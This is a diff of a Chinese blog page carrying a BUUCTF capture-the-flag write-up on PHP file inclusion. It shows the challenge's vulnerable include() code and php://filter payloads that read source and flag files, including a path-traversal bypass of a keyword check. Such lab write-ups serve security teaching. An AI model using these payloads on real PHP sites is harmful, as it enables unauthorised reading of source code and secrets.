@@ -13,16 +13,11 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="BUUCTF 网址：https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png">
 <meta property="article:published_time" content="2022-03-28T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-03-29T15:31:47.023Z">
 <meta property="article:author" content="hdfzzf">
 <meta property="article:tag" content="PHP伪协议">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png">
     
     
       
@@ -158,32 +153,45 @@
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
 <p>进入环境之后，页面有两个选择</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
 <p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
 <p>此时打开源码发现：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
 <p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
 <h1 id="解题">解题</h1>
 <p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
-<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
+<p>可是这并不算报错，因此，尝试一下
+<code>?category=meowers.php</code>，此时发现报错了！</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
 <p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
-<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
+<p>利用伪协议 <code>php://filter</code> 尝试读取一下
+<code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
 <p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
-<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
+<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了
+<code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
 <p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>通过代码审计知道：</p>
 <ol type="1">
 <li>需要传入参数 category</li>
-<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
+<li>category 需要包含 <code>woofers</code>， <code>meowers</code>，
+<code>index</code> 三者之一</li>
 <li>我们传入的文件名不需要包含 .php</li>
 </ol>
-<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
-<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
-<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
+<p>假设我们读取的是
+<code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
+<p>两者都能得到结果（第二个payload就是 <code>php://filter</code>
+伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
+<p>这里不是很懂，不过根据结果可以猜测，<code>index</code>
+的位置上应该放的是 filter
+这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
 <h1 id="总结">总结</h1>
 <p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
 
@@ -254,7 +262,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
